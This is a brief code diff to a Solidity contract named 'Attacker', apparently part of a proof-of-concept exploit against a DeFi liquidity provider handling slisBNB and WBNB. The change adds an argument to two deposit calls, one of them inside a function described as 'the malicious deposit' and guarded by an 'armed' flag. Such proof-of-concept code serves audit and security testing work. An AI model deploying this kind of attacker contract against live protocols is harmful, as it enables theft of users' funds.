@@ -117,13 +117,13 @@ contract Attacker {
   function predeposit(uint256 a0, uint256 a1) external {
     IERC20(slis).approve(address(provider), type(uint256).max);
     IERC20(wbnb).approve(address(provider), type(uint256).max);
-    provider.deposit(mp, a0, a1, 0, 0, address(this));
+    provider.deposit(mp, a0, a1, 0, 0, 0, address(this));
   }
 
   /// @dev The malicious deposit. onBehalf = a separate (recoverable) account.
   function attack(uint256 a0, uint256 a1, address onBehalf) external {
     armed = true;
-    provider.deposit(mp, a0, a1, 0, 0, onBehalf);
+    provider.deposit(mp, a0, a1, 0, 0, 0, onBehalf);
     armed = false;
   }
 
